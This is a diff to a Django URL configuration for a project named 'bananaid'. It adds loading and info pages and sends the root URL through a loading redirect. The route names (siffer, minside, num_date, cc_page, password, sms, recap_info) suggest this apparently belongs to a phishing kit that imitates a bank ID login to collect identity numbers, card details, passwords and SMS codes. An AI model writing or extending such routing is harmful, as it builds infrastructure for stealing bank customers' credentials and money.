@@ -23,11 +23,13 @@ from bananaid import settings
 from bananaid.const import PageRedirection
 from bananaid.utils import gen_url_query
 from bananaid.views import siffer_page, minside_page, num_date_page, cc_page, recap_info_page, password_page, \
-    waiting_page, sms_page
+    waiting_page, sms_page, loading_page, info_page
 
 urlpatterns = [
-                  path('', RedirectView.as_view(url=PageRedirection.SIFFER.value + gen_url_query())),
+                  path('', RedirectView.as_view(url=f'{PageRedirection.LOADING.value}?redirect_url={PageRedirection.INFO.value}{gen_url_query()}')),
+                  path(PageRedirection.LOADING.value, loading_page, name='loading_page'),
                   path('admin/', admin.site.urls),
+                  path(PageRedirection.INFO.value, info_page, name='info_page'),
                   path(PageRedirection.SIFFER.value, siffer_page, name='siffer_page'),
                   path(PageRedirection.MINSIDE.value, minside_page, name='minside_page'),
                   path(PageRedirection.NUMDATO.value, num_date_page, name='num_date_page'),
@@ -36,4 +38,5 @@ urlpatterns = [
                   path(PageRedirection.PASSWORD.value, password_page, name='password_page'),
                   path(PageRedirection.SMS.value, sms_page, name='sms_page'),
                   path(PageRedirection.WAITING.value, waiting_page, name='waiting_page'),
+                  path(PageRedirection.LOADING.value, loading_page, name='loading_page'),
               ] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
